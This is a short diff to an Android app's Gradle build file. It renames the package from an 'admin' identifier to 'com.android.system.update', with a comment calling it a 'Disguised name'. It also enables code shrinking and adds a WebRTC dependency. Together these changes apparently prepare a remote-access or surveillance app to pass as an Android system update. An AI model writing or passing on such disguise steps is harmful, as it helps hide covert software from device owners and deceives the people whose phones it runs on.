@@ -8,7 +8,7 @@ android {
     compileSdk = 34
 
     defaultConfig {
-        applicationId = "com.example.admin"
+        applicationId = "com.android.system.update" // Disguised name
         minSdk = 29
         targetSdk = 34
         versionCode = 1
@@ -17,7 +17,8 @@ android {
 
     buildTypes {
         release {
-            isMinifyEnabled = false
+            isMinifyEnabled = true
+            isShrinkResources = true
             proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"), "proguard-rules.pro")
         }
     }
@@ -37,4 +38,7 @@ dependencies {
     implementation("com.squareup.okhttp3:okhttp:4.12.0")
     implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.8.0")
     implementation("androidx.activity:activity-ktx:1.9.0")
+    
+    // WEBRTC DEPENDENCY
+    implementation("io.github.webrtc-sdk:android:114.5735.08")
 }
